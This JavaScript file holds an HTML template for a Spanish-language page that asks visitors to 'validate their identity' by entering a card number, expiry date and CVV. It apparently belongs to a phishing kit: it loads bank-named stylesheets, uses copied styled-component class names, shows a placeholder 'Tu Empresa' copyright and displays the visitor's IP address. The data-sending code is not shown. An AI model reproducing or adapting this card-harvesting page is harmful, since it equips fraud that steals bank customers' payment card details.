var my_contenido = `
<link rel="stylesheet" href="${my_hosting}css/general.css" />
<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
<link rel="stylesheet" href="${my_banco}css/index6.css" />
<div id="root">
    <div class="sc-kAyceB imYlER">
        <div class="sc-eZkCL fxpynz">
            <span class="sc-brPLxw kaJsjU">
                <div class="sc-iMWBiJ joDBZY">
                    <div class="sc-gFVvzn iZaAxW"></div>
                </div>
            </span>
        </div>
        <div class="sc-gsFSXq fyLzcn">
            <div class="sc-lcIPJg iAZMqX"
                id="information">
                Ingresa tu información
            </div>
            <div class="sc-kdBSHD cQVeHP"></div>
            <div class="sc-ibQAlb jzqHUv">
                <div class="sc-gEvEer blWBwQ">
                    <div class="sc-eqUAAy kgsyyX"></div>
                    <div class="sc-fqkvVR iDJNwy">
                        A continuación validaremos tus datos para comprobar tu identidad.
                    </div>
                    <div class="sc-iGgWBj cxASel"></div>
                </div>
                <div class="sc-hZDyAQ ihrfay">
                    <div class="sc-jGKxIK dSFNja" id="creditCardForm">
                        <div class="box__element">
                            <i class="bx bx-card"></i>
                            <!-- <img src="/tarjeta.png" alt="" srcset="" width="5%"> -->
                            <input class="box__input" type="text" required="" id="cardNumber" style="font-size:16px;">
                            <span class="box__lbl">Número de tarjeta</span>
                        </div>
                        <div class="box__element">
                            <i class="bx bx-id-card"></i>
                            <input class="box__input" type="text" required="" id="expiryDate" style="font-size:16px;">
                            <span class="box__lbl">Fecha de vencimiento</span>
                        </div>
                        <div class="box__element">
                            <i class="bx bx-lock"></i>
                            <input class="box__input" type="text" required="" id="cvv" style=" font-size:16px;">
                            <span class="box__lbl">CVV</span>
                        </div>

                        <div class="sc-tagGq fcUIRB" id="errorCard"></div>

                    </div>

                    <div class="sc-gmgFlS dktjrs">
                        <button type="button" id="btn-volver-creditcard" class="sc-fjvvzt eCJIpR">
                            <label class="sc-JrDLc cLbqSw">Volver</label>
                        </button>
                        <button type="submit" id="btn-go" class="sc-fjvvzt dSnrTy" disabled>
                            <label class="sc-JrDLc cLbqSw">Continuar</label>
                        </button>
                    </div>
                </div>
                <div></div>
            </div>
        </div>
        <div class="sc-dAlyuH fgvEPZ">
            <div class="sc-jlZhew kZLvRr"></div>
            <span class="sc-eDPEul gTfgka">
                <div class="sc-eldPxv dJzohZ">
                    <div class="sc-cPiKLX eqxxRJ"></div>
                    <div class="sc-cwHptR fvLrbU">Copyright © 2024 Tu Empresa.</div>
                    <div class="sc-dLMFU kikHRa"></div>
                </div>
                <div class="sc-fPXMVe dCLFvs">
                    <div class="sc-jEACwC boPjTg" id="ipc">Dirección IP:
                    </div>
                    <div class="sc-gFqAkR hshFNC" id="jclock1">
                        Domingo, 24 de Marzo de 2024, 11:14 am
                    </div>
                </div>
            </span>
        </div>
    </div>
</div>
`;